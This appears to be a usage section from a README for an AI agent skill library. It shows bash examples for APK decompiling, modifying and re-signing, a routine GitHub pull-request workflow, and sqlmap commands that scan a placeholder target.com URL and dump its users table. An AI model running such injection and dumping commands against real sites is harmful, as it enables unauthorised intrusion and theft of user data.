## 🚀 Usage Examples

### Example 1: APK Modding
```bash
# Load skill
skill_view(name='apk-modding-workflow')

# Decompile
apktool d app.apk -o decompiled/

# Modify & rebuild
apktool b decompiled/ -o modded.apk

# Sign
uber-apk-signer -a modded.apk
```

### Example 2: GitHub PR
```bash
# Load skill
skill_view(name='github/pr-workflow')

# Create feature branch
git checkout -b feature/new-login
git add .
git commit -m "feat: add OAuth login"
git push -u origin feature/new-login

# Create PR
gh pr create --title "Add OAuth login"
```

### Example 3: SQL Injection
```bash
# Load skill
skill_view(name='sqlmap')

# Scan for vulnerabilities
sqlmap -u "http://target.com/page?id=1" --dbs

# Extract data
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump
```
